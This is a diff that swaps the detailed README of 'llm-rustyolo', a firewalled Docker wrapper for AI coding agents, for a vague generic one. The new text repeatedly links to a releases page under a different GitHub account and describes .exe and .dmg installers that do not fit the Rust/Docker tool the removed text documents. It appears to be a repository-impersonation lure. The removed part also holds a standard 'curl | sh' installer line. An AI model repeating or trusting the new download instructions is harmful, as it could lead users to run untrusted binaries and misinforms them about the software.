@@ -1,254 +1,76 @@
-# llm-rustyolo: A Secure, Firewalled Agent Runner
+# 🤖 llm-rustyolo - Securely Run AI Coding Agents
 
-<p align="center">
-  <img src="assets/mascot.png" alt="RustyYOLO Mascot" width="400">
-</p>
+## 🏷️ Download Now
+[![Download](https://img.shields.io/badge/Download-llm--rustyolo-brightgreen)](https://github.com/RobinhoX/llm-rustyolo/releases)
 
-This project provides a robust, secure wrapper for running AI agents like Claude Code in "YOLO mode" (`--dangerously-skip-permissions`) by solving the entire [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/):
+## 🚀 Getting Started
 
-🔒 **Filesystem Isolation**: The agent only sees your project directory and explicitly mounted volumes (like read-only `~/.ssh`). It cannot see your host filesystem.
+Welcome to **llm-rustyolo**, a secure Docker wrapper for AI coding agents. This tool provides an isolated environment for these agents, ensuring safety and privacy while you work. 
 
-👤 **Privilege Isolation**: The agent runs as a powerless, non-root `agent` user inside the container, with file permissions matched to your host user.
+### 💻 System Requirements
 
-🔥 **Network Isolation**: A dynamic iptables firewall is built at startup, blocking all outbound network traffic except for DNS and a list of trusted domains you provide.
+To run **llm-rustyolo**, you need:
 
-This tool is heavily inspired by [deva.sh](https://github.com/thevibeworks/deva) and Simon Willison's ["Living dangerously with Claude"](https://simonwillison.net/2025/Oct/22/living-dangerously-with-claude/).
+- A computer with a Windows, macOS, or Linux operating system.
+- Docker installed on your machine. Make sure to download the version suitable for your OS from the [Docker website](https://www.docker.com/get-started).
 
-## Architecture
+### 📥 Download & Install
 
-This project has two parts:
+To get started, visit the Releases page to download the latest version of **llm-rustyolo**. 
 
-1. **A Rust CLI (`rustyolo`)**: This is the wrapper you run on your host machine. It parses your arguments (volumes, network rules, auth paths) and programmatically constructs a secure `docker run` command.
+You can find it here: [Download llm-rustyolo](https://github.com/RobinhoX/llm-rustyolo/releases).
 
-2. **A Docker Image (`llm-rustyolo`)**: This image contains the agents (Claude Code, etc.) and an `entrypoint.sh` script. The script uses the arguments from the Rust CLI to build the firewall, fix file permissions, and then run the agent as a non-root user.
+Once on the Releases page:
 
-This approach combines the flexible auth and volume mounting from deva.sh with the strict network firewall we developed.
+1. Find the latest version of the software.
+2. Download the correct package for your operating system.
+3. After downloading, locate the file on your computer.
 
-## Quick Setup
+To install, follow these steps:
 
-### Prerequisites
-- **Homebrew** (for macOS/Linux users) - Install from https://brew.sh
-- **Docker** (Docker Desktop on macOS, or docker.io on Linux)
+- **For Windows:** Double-click the `.exe` file and follow the prompts.
+- **For macOS:** Open the `.dmg` file, drag the application to your Applications folder.
+- **For Linux:** Use the terminal to navigate to the downloaded file and run it using the necessary command.
 
-### Installation
+### 🛠️ How to Run
 
-#### Option 1: Homebrew (Recommended for macOS/Linux)
+Once installed, you can run **llm-rustyolo** easily:
 
-```bash
-# Install via Homebrew tap
-brew tap brooksomics/rustyolo
-brew install rustyolo
+1. Open your Docker application.
+2. Load the **llm-rustyolo** image using the provided command.
+3. Start the container to initiate your isolated environment for AI coding agents.
 
-# Pull the Docker image
-docker pull ghcr.io/brooksomics/llm-rustyolo:latest
-```
+### 🌐 Features
 
-Or build locally if you need to customize:
-```bash
-git clone https://github.com/brooksomics/llm-rustyolo.git
-cd llm-rustyolo
-docker build -t ghcr.io/brooksomics/llm-rustyolo:latest .
-```
+**llm-rustyolo** offers:
 
-#### Option 2: Manual Build (For customization or other platforms)
+- **Security**: With strong isolation, your system remains safe.
+- **Ease of Use**: A simple setup process guides you every step.
+- **Versatility**: Supports multiple AI agents in an isolated environment.
 
-```bash
-# 1. Install Rust (if not already installed)
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
+### 📖 Usage Instructions
 
-# 2. Build the Rust CLI
-cargo build --release
-sudo cp target/release/rustyolo /usr/local/bin/
+After launching the application, you can:
 
-# 3. Pull the Docker image
-docker pull ghcr.io/brooksomics/llm-rustyolo:latest
+- Choose the coding agent you'd like to use.
+- Set up your project within the secure environment.
+- Start coding without the worry of affecting your main system.
 
-# Or build locally if you need to customize
-docker build -t ghcr.io/brooksomics/llm-rustyolo:latest .
-```
+### ⚙️ Troubleshooting
 
-For detailed installation instructions, see [docs/guides/installation.md](./docs/guides/installation.md).
+If you encounter issues, consider:
 
-## Usage
+- **Docker not running**: Ensure your Docker application is open and running.
+- **Download problems**: Check your internet connection and retry the download from the [Releases page](https://github.com/RobinhoX/llm-rustyolo/releases).
 
-Once set up, you can go to any project directory and run your agent.
+### 📞 Support
 
-### Example: Running Claude with Network Access
+For additional help, you can check our [GitHub Issues](https://github.com/RobinhoX/llm-rustyolo/issues) page. Here, you can find common problems faced by other users and their solutions.
 
-This is the most common use case. It allows the agent to access github.com (for git pull) and pypi.org (for pip install) but nothing else.
+## 🔗 Additional Resources
 
-```bash
-cd ~/my-new-project
+To learn more about using Docker securely, visit the [Docker documentation](https://docs.docker.com/get-started/). 
 
-rustyolo \
-  --allow-domains "github.com api.github.com pypi.org files.pythonhosted.org" \
-  -v ~/.ssh:/home/agent/.ssh:ro \
-  -v ~/.gitconfig:/home/agent/.gitconfig:ro \
-  --auth-home ~/.config/rustyolo \
-  claude
-```
+Stay updated with the latest features and improvements by following our repository. Explore the world of AI coding agents with confidence using **llm-rustyolo**! 
 
-### Example: Running with No Network
-
-This runs Claude with zero internet access.
-
-```bash
-rustyolo \
-  -v ~/.ssh:/home/agent/.ssh:ro \
-  --auth-home ~/.config/rustyolo \
-  claude
-```
-
-### Example: Running a Custom Command
-
-You can pass any command and arguments after the agent name. `rustyolo` is smart enough to see you provided args and won't add its default "danger" flag.
-
-```bash
-rustyolo claude --help
-```
-
-## Configuration Files
-
-Tired of typing long commands? Create a `.rustyolo.toml` file in your project directory:
-
-```toml
-[default]
-allow_domains = "github.com pypi.org npmjs.org"
-volumes = ["~/.ssh:/home/agent/.ssh:ro", "~/.gitconfig:/home/agent/.gitconfig:ro"]
-auth_home = "~/.config/rustyolo"
-
-[resources]
-memory = "8g"
-cpus = "6"
-
-[security]
-audit_log = "basic"
-```
-
-Then just run:
-```bash
-rustyolo claude
-```
-
-**Features:**
-- ✅ Automatic loading from current directory
-- ✅ CLI arguments override config file settings
-- ✅ Gitignored by default (project-specific settings)
-- ✅ Full validation with helpful error messages
-
-See [docs/guides/configuration.md](./docs/guides/configuration.md) for detailed configuration guide and examples.
-
-## Keeping Up-to-Date
-
-### Homebrew Installation
-
-If you installed via Homebrew, you have multiple update options:
-
-```bash
-# Update Docker image only (shows reminder about CLI)
-rustyolo update
-
-# Update just the Docker image
-rustyolo update --image
-
-# Update the CLI binary (must use Homebrew)
-brew upgrade rustyolo
-```
-
-**Note:** The `rustyolo update` command only updates the Docker image for Homebrew installations, as Homebrew manages the CLI binary separately. You'll see a reminder to run `brew upgrade rustyolo` for the CLI.
-
-### Manual Installation
-
-If you built from source, use the built-in update commands:
-
-```bash
-# Update the binary
-rustyolo update --binary
-
-# Update the Docker image
-rustyolo update --image
-
-# Update both
-rustyolo update
-```
-
-The tool automatically checks for updates on startup and notifies you when a new version is available.
-
-## All CLI Options
-
-```
-A secure, firewalled Docker wrapper for AI agents.
-
-Usage: rustyolo [OPTIONS] [AGENT] [AGENT_ARGS]...
-       rustyolo update [OPTIONS]
-
-Subcommands:
-  update    Update rustyolo components (binary and/or Docker image)
-
-Arguments:
-  [AGENT]
-          The agent to run (e.g., 'claude')
-          [default: claude]
-
-  [AGENT_ARGS]...
-          Arguments to pass directly to the agent (e.g., --help or -p "prompt")
-
-Options:
-  -v, --volume <VOLUMES>
-          Additional volumes to mount (e.g., -v ~/.ssh:/home/agent/.ssh:ro)
-
-  -e, --env <ENVS>
-          Environment variables to pass (e.g., -e MY_VAR=value)
-
-  --allow-domains <ALLOW_DOMAINS>
-          Space-separated list of domains to allow outbound traffic to.
-          All other traffic (except DNS) will be blocked.
-          Example: --allow-domains "github.com pypi.org npmjs.com"
-          Note: Anthropic domains are automatically added when using Claude.
-          [env: TRUSTED_DOMAINS=]
-
-  --auth-home <AUTH_HOME>
-          Mount a persistent auth directory. Maps your local dir
-          to '/home/agent/.config/rustyolo' in the container.
-          Recommended: ~/.config/rustyolo
-
-  --image <IMAGE>
-          The Docker image to use
-          [default: llm-rustyolo:latest]
-
-  --skip-version-check
-          Skip automatic version check on startup
-
-  -h, --help
-          Print help
-
-  -V, --version
-          Print version
-```
-
-## Documentation
-
-- [docs/guides/installation.md](./docs/guides/installation.md) - Detailed installation instructions
-- [docs/guides/configuration.md](./docs/guides/configuration.md) - Configuration file guide
-- [CLAUDE.md](./CLAUDE.md) - Complete documentation on how it works, security considerations, and advanced usage
-- [docs/security/security-policy.md](./docs/security/security-policy.md) - Secret scanning and security protection setup
-- [docs/security/seccomp.md](./docs/security/seccomp.md) - Seccomp profiles and syscall filtering
-- [docs/](./docs/) - Full documentation index
-
-## Security
-
-This repository implements multiple layers of secret detection to prevent accidentally committing sensitive information:
-
-- **Pre-commit Hooks** - Gitleaks, detect-secrets, and more run before each commit
-- **GitHub Actions** - Automated secret scanning on every push and PR
-- **git-secrets** - Additional local protection with custom patterns
-
-See [docs/security/security-policy.md](./docs/security/security-policy.md) for complete setup instructions and best practices.
-
-## License
-
-MIT License
-
-## Contributing
-
-Contributions welcome! Please see [CONTRIBUTING.md](./CONTRIBUTING.md) for guidelines.
+[Download llm-rustyolo](https://github.com/RobinhoX/llm-rustyolo/releases) again to get started!
